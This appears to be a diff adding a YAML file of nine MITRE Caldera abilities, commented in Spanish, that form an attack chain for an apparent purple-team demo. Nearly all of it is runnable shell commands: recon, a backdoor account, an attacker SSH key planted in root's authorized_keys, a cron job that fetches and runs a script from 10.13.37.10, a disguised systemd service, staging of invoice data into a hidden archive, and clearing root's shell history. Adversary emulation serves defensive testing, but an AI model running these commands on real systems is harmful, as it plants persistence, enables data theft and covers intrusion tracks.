@@ -1,0 +1,101 @@
+# cadena_abilities.yml - las 9 acciones de la cadena de ataque, cada una con su tecnica
+# MITRE ATT&CK. Se copian a caldera/data/abilities/ y Caldera las ejecuta en orden en el
+# servidor.  github.com/logicalpeyote777/morinicomputers
+- id: aa000001-0000-4000-8000-00000000t082
+  name: Reconocimiento del sistema
+  description: Que sistema es y que version - T1082
+  tactic: discovery
+  technique_id: T1082
+  technique_name: System Information Discovery
+  platforms:
+    linux:
+      sh:
+        command: uname -a; head -2 /etc/os-release
+
+- id: aa000002-0000-4000-8000-00000000t087
+  name: Enumeracion de cuentas locales
+  description: Quien tiene cuenta y quien manda - T1087.001
+  tactic: discovery
+  technique_id: T1087.001
+  technique_name: 'Account Discovery: Local Account'
+  platforms:
+    linux:
+      sh:
+        command: cat /etc/passwd | tail -4; getent group sudo
+
+- id: aa000003-0000-4000-8000-00000000t046
+  name: Servicios de red a la escucha
+  description: Que puertos abiertos hay para saltar a otra maquina - T1046
+  tactic: discovery
+  technique_id: T1046
+  technique_name: Network Service Discovery
+  platforms:
+    linux:
+      sh:
+        command: ss -tulpn | head -8
+
+- id: aa000004-0000-4000-8000-00000000t136
+  name: Crear cuenta de respaldo
+  description: Una cuenta propia con aspecto legitimo - T1136.001
+  tactic: persistence
+  technique_id: T1136.001
+  technique_name: 'Create Account: Local Account'
+  platforms:
+    linux:
+      sh:
+        command: useradd -m -s /bin/bash soporte-tec 2>/dev/null; id soporte-tec
+
+- id: aa000005-0000-4000-8000-00000000t098
+  name: Plantar clave SSH
+  description: Entrada permanente sin contrasena - T1098.004
+  tactic: persistence
+  technique_id: T1098.004
+  technique_name: 'Account Manipulation: SSH Authorized Keys'
+  platforms:
+    linux:
+      sh:
+        command: mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILabAtacante2026PurpleTeamDemoKeyXXXX atacante@kali' >> /root/.ssh/authorized_keys; tail -1 /root/.ssh/authorized_keys
+
+- id: aa000006-0000-4000-8000-00000000t053
+  name: Persistencia por cron
+  description: Una tarea programada que vuelve a llamar a casa - T1053.003
+  tactic: persistence
+  technique_id: T1053.003
+  technique_name: 'Scheduled Task/Job: Cron'
+  platforms:
+    linux:
+      sh:
+        command: printf '*/5 * * * * root curl -s http://10.13.37.10:8000/b.sh | sh\n' > /etc/cron.d/backup-sys; cat /etc/cron.d/backup-sys
+
+- id: aa000007-0000-4000-8000-00000000t543
+  name: Persistencia por servicio systemd
+  description: Un servicio que arranca con la maquina - T1543.002
+  tactic: persistence
+  technique_id: T1543.002
+  technique_name: 'Create or Modify System Process: Systemd Service'
+  platforms:
+    linux:
+      sh:
+        command: printf '[Unit]\nDescription=System Update Helper\n[Service]\nExecStart=/bin/sh -c "sleep 3600"\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/sys-update.service; systemctl daemon-reload; systemctl enable sys-update.service 2>&1 | tail -1
+
+- id: aa000008-0000-4000-8000-00000000t074
+  name: Empaquetar los datos del negocio
+  description: Facturas y clientes listos para salir - T1074.001
+  tactic: collection
+  technique_id: T1074.001
+  technique_name: 'Data Staged: Local Data Staging'
+  platforms:
+    linux:
+      sh:
+        command: tar -czf /tmp/.datos.tar.gz /srv/facturas 2>/dev/null; ls -lh /tmp/.datos.tar.gz
+
+- id: aa000009-0000-4000-8000-00000000t070
+  name: Borrar el historial
+  description: Limpiar las huellas de la shell - T1070.003
+  tactic: defense-evasion
+  technique_id: T1070.003
+  technique_name: 'Indicator Removal: Clear Command History'
+  platforms:
+    linux:
+      sh:
+        command: truncate -s0 /root/.bash_history; echo historial borrado
